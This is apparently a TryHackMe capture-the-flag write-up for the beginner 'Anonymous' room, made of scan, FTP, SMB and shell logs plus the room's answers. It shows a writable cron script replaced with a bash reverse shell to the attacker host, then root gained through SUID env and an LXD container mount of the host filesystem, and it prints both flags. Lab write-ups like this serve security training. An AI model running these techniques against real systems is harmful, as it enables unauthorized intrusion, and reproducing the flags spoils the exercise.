---
Not the hacking group
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/876a5185c429c9703e625cb48c39637b.png)

![](https://i.imgur.com/KHhJB15.png)

### Pwn

 Start Machine

![](https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1024px-Anonymous_emblem.svg.png)  

  

Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

--------------------------------------------------------------------

_For more information on Linux, check out_ [Learn Linux](https://tryhackme.com/room/zthlinux)

  

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.207.25 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.207.25:139
Open 10.10.207.25:445
Open 10.10.207.25:21
Open 10.10.207.25:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 13:40 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:40
Scanning 10.10.207.25 [4 ports]
Discovered open port 445/tcp on 10.10.207.25
Discovered open port 22/tcp on 10.10.207.25
Discovered open port 21/tcp on 10.10.207.25
Discovered open port 139/tcp on 10.10.207.25
Completed Connect Scan at 13:40, 0.20s elapsed (4 total ports)
Initiating Service scan at 13:40
Scanning 4 services on 10.10.207.25
Completed Service scan at 13:40, 12.08s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.207.25.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:40
NSE: [ftp-bounce 10.10.207.25:21] PORT response: 500 Illegal PORT command.
Completed NSE at 13:40, 8.45s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 1.43s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Nmap scan report for 10.10.207.25
Host is up, received user-set (0.20s latency).
Scanned at 2023-02-25 13:40:04 EST for 23s

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-02-25T18:40:18
|_  start_date: N/A
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3606/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 48304/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 32668/udp): CLEAN (Failed to receive data)
|   Check 4 (port 62060/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-02-25T18:40:18+00:00
|_clock-skew: mean: 0s, deviation: 1s, median: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.80 seconds

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.207.25        
Connected to 10.10.207.25.
220 NamelessOne's FTP Server!
Name (10.10.207.25:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||31255|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||40045|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1161 Feb 25 18:43 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> more to_do.txt
I really need to disable the anonymous login...it's really not safe
ftp> more removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
ftp> more clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/remo
ved_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/
scripts/removed_files.log;done
fi

┌──(witty㉿kali)-[~]
└─$ smbclient -N -L 10.10.207.25                                    

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            ANONYMOUS

┌──(witty㉿kali)-[~]
└─$ smbclient -N \\\\10.10.207.25\\pics
Try "help" to get a list of possible commands.
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

		20508240 blocks of size 1024. 13306804 blocks available
smb: \> mget *
Get file corgo2.jpg? yes
getting file \corgo2.jpg of size 42663 as corgo2.jpg (33.2 KiloBytes/sec) (average 33.2 KiloBytes/sec)
Get file puppos.jpeg? yes
getting file \puppos.jpeg of size 265188 as puppos.jpeg (157.2 KiloBytes/sec) (average 103.6 KiloBytes/sec)
smb: \> exit

                                                                                  
┌──(witty㉿kali)-[~]
└─$ file corgo2.jpg         
corgo2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 800x533, components 3
                                                                                  
┌──(witty㉿kali)-[~]
└─$ file puppos.jpeg 
puppos.jpeg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=19, height=3744, bps=242, PhotometricInterpretation=RGB, description=Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung., manufacturer=Canon, model=Canon EOS 5D Mark II, orientation=upper-left, width=5616], progressive, precision 8, 600x400, components 3

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.207.25
Connected to 10.10.207.25.
220 NamelessOne's FTP Server!
Name (10.10.207.25:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21690|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||54536|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         3913 Feb 25 19:47 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||52682|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |*************************************|   314        2.47 MiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (1.57 KiB/s)
ftp> exit
221 Goodbye.

└─$ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        bash -i >& /dev/tcp/10.8.19.103/4443 0>&1
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.207.25
Connected to 10.10.207.25.
220 NamelessOne's FTP Server!
Name (10.10.207.25:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||54468|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
c226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||44064|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         3999 Feb 25 19:49 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||63683|)
150 Ok to send data.
100% |***************************************************************|   268        4.64 MiB/s    00:00 ETA
226 Transfer complete.
268 bytes sent in 00:00 (0.65 KiB/s)
ftp> more clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        bash -i >& /dev/tcp/10.8.19.103/4443 0>&1
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;
done
fi

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.207.25] 34408
bash: cannot set terminal process group (1594): Inapproprinnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnamelessone@anonymous:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
namelessone@anonymous:~$ ls
ls
pics  user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740

namelessone@anonymous:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             43K Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             27K Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root   root             40K Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root   root             27K Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9066/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9066/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9066/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9066/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9066/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9066/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9066/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9066/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9066/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9066/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9066/usr/sbin/pppd
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             35K Jan 18  2018 /usr/bin/env
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

2 methods env and lxd

https://gtfobins.github.io/gtfobins/env/

namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363

namelessone@anonymous:~$ cd /tmp
cd /tmp
namelessone@anonymous:/tmp$ ls
ls
systemd-private-ee99b29fc2a54f40978ee4a4d79d864b-systemd-resolved.service-i3uH6O
systemd-private-ee99b29fc2a54f40978ee4a4d79d864b-systemd-timesyncd.service-pUzSix

┌──(witty㉿kali)-[~/Downloads/lxd-alpine-builder]
└─$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  LICENSE
build-alpine                              README.md
                                                               
┌──(witty㉿kali)-[~/Downloads/lxd-alpine-builder]
└─$ python3 -m http.server 1337                            
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.207.25 - - [25/Feb/2023 14:56:54] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -

namelessone@anonymous:/tmp$ wget http://10.8.19.103:1337/alpine-v3.13-x86_64-20210218_0139.tar.gz
<9.103:1337/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2023-02-25 19:56:54--  http://10.8.19.103:1337/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.8.19.103:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64 100%[===================>]   3.11M   842KB/s    in 4.3s    

2023-02-25 19:56:59 (746 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]


namelessone@anonymous:/tmp$ lxc image list
lxc image list
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:18.04

+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+

namelessone@anonymous:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
<e-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
namelessone@anonymous:/tmp$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Feb 25, 2023 at 7:58pm (UTC) |
+---------+--------
namelessone@anonymous:/tmp$ lxc init myimage alpine -c security.privileged=true
<lxc init myimage alpine -c security.privileged=true
Creating alpine
Error: No storage pool found. Please create a new storage pool
namelessone@anonymous:/tmp$ lxd init
lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: yes
yes
What name should be used to identify this node in the cluster? [default=anonymous]: 

What IP address or DNS name should be used to reach this node? [default=10.10.207.25]: 

Are you joining an existing cluster? (yes/no) [default=no]: 

Setup password authentication on the cluster? (yes/no) [default=yes]: 

Trust password for new clients: 

Again: 

Do you want to configure a new local storage pool? (yes/no) [default=yes]: 

Name of the storage backend to use (btrfs, dir) [default=btrfs]: 

Create a new BTRFS pool? (yes/no) [default=yes]: 

Would you like to use an existing block device? (yes/no) [default=no]: 

Size in GB of the new loop device (1GB minimum) [default=15GB]: 

Do you want to configure a new remote storage pool? (yes/no) [default=no]: 

Would you like to connect to a MAAS server? (yes/no) [default=no]: 

Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: 

Would you like to create a new Fan overlay network? (yes/no) [default=yes]: 

What subnet should be used as the Fan underlay? [default=auto]: 

Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 


Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 

namelessone@anonymous:/tmp$ lxc init myimage alpine -c security.privileged=true
<lxc init myimage alpine -c security.privileged=true
Creating alpine
namelessone@anonymous:/tmp$ lxc config device add alpine mydevice disk source=/ path=/mnt/root/ recursive=true
<device disk source=/ path=/mnt/root/ recursive=true
Device mydevice added to alpine
namelessone@anonymous:/tmp$ lxc start alpine
lxc start alpine
namelessone@anonymous:/tmp$ lxc exec alpine /bin/sh
lxc exec alpine /bin/sh
~ # wwhoami
whoami
root
~ # ccd /root
cd /root
~ # lls
ls
~ # ccat /mnt/root/root/root.txt
cat /mnt/root/root/root.txt
4d930091c31a622a7ed10f27999af363


```

Enumerate the machine.  How many ports are open?

*4*

What service is running on port 21?  

*ftp*


What service is running on ports 139 and 445?  

*smb*

There's a share on the user's computer.  What's it called?  

*pics*

user.txt

What's that log file doing there?... nc won't work the way you'd expect it to

*90d6f992585815ff991e68748c414740*

root.txt

This may require you to do some outside research

*4d930091c31a622a7ed10f27999af363*


[[Training for New Analyst]]